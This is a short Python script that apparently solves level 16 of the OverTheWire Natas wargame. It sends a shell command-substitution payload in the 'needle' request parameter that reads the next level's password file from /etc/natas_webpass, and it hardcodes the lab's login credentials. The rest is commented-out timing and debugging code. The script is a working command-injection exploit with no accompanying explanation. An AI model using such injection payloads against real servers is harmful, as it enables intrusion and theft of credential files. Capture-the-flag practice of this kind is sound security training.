import requests
import datetime
import sys

key  = 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'
user = 'natas16'
url  = 'natas16.natas.labs.overthewire.org'
payload = {'needle':'$(cut -c5 /etc/natas_webpass/natas17)'}

req = requests.get('http://' + user +':'+ key +"@"+ url, payload)

print req.request.headers
print req.text





# time_start = datetime.datetime.now();

# req = requests.post('http://' + user +':'+ key +"@"+ url, payload)

# time_end = datetime.datetime.now();

# #print time_end - time_start

# print(req.request.body)
# print(req.request.headers)

# print('\n{}\n\n{}'.format(
#     '\n'.join('{}: {}'.format(k, v) for k, v in req.headers.items()),
#     req.text,
# ))